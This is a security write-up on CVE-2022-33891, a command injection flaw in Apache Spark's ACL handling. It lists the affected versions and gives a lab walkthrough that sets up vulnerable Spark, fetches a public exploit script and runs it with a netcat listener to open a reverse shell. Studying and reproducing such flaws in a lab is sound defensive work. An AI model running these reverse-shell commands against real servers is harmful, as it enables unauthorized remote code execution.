# CVE-2022–33891 — Apache Spark Shell Command Injection Vulnerability

1.	Product Details
Apache Spark is an open-source, distributed computing framework designed for big data processing. It excels in handling large datasets through in-memory processing, offers versatile APIs in multiple programming languages, and supports batch processing, real-time streaming, machine learning, and graph analytics. Spark's core abstraction, Resilient Distributed Datasets (RDDs), ensures fault tolerance. It also provides a Data Frame API for structured data manipulation and includes machine learning libraries. Spark can integrate with various big data tools, supports real-time processing with Spark Streaming, and can be deployed on various cluster managers and cloud platforms. Its scalability, fault tolerance, and vibrant open-source community make it a popular choice for big data analytics.

2.	Vulnerability
Apache Spark released the latest security bulletin on July 18, which contains a shell command injection vulnerability (CVE-2022-33891). The severity is important. The security researcher Kostya Kortchinsky (Databricks) has been credited with reporting this flaw. In this official statement, a newly discovered vulnerability related to its Access Control List (ACL) implementation, which is tracked CVSS score of 8.8. This vulnerability arises from the way Apache Spark handles changes to the ACL configuration after passing through an authentication filter. Specifically, it checks if a user has the necessary permissions to view or modify an application. When ACLs are enabled, a particular code path in the HttpSecurityFilter can potentially enable an attacker to impersonate another user by providing an arbitrary username. If successful, this impersonation could lead to the execution of arbitrary shell commands within the context of the user that Spark is currently operating as.

3.	Impacted Versions
   This security issue impacts Apache Spark versions 3.0.3 and earlier, Versions 3.1.1 to 3.1.2, Versions 3.2.0 to 3.2.1.

The underlying cause of this CVE is categorized as "Improper Neutralization of Special Elements used in a Command," commonly referred to as a 'Command Injection' vulnerability.
 
4.	Proof of Concept (PoC) : Use an existing environment with above mentioned vulnerable versions or set up a new environment. For setting up new environment follow the following steps – 

STEP 1:
Install OPENJDK of version 11 with commands – 
sudo apt-get update
sudo apt-get install openjdk-11-jdk
java -version
 
STEP 2:
Install SCALA of version 3.1.3
Download TAR file from GitHub - https://github.com/lampepfl/dotty/releases/tag/3.1.3
Extract the TAR file with commands – 
cd Downloads
tar xvf {scala filename}
sudo su
mv {scala filename}  /usr/local/scala
exit
export PATH=$PATH:/usr/local/scala/bin
scala -version
 
STEP 3:
Install Apache Spark
LINK - https://archive.apache.org/dist/spark/spark-3.1.1/
FILE - spark-3.1.1-bin-hadoop2.7.tgz
Commands – 
tar xvf spark-3.1.1-bin-hadoop2.7.tgz
mv spark-3.1.1-bin-hadoop2.7.tgz /usr/local/spark
exit
sudo nano ~/.zsharc
export PATH=$PATH:/usr/local/spark/bin (Add command in the file)
source ~/.zsharc
spark-shell
 
Exit the Shell – Using Ctrl + C
STEP 4:
Enable ACL with commands – 
cd /usr/local/spark/conf
cp spark-defaults.conf.template spark-defaults.conf
echo "spark.acls.enable       true" >> spark-defaults.conf
cat spark-defaults.conf
 
cd /usr/local/spark
cd sbin
./start-master.sh
spark-shell
 
STEP 5:
Download the exploit zip file - https://github.com/HuskyHacks/cve-2022-33891
Unzip the file,
Run the Commands – 
cd Downloads/cve-2022-33891-main
python3 poc.py -u http://192.168.154.128 -p 8080 --check –verbose
 
STEP 6:
Install Netcat – traditional using the command – 
sudo apt install netcat-traditional
STEP 7:
Run the exploit using these commands in different terminals – 
In first shell - nc -lvp 9001
In second shell - python3 poc.py -u http://192.168.154.128 -p 8080 --revshell -lh 192.168.154.128 -lp 9001 –verbose
 
5.	Mitigation
   Update Apache spark to the latest version.
  	Have better input validations.
  	Detect malicious URL parameters and block them.
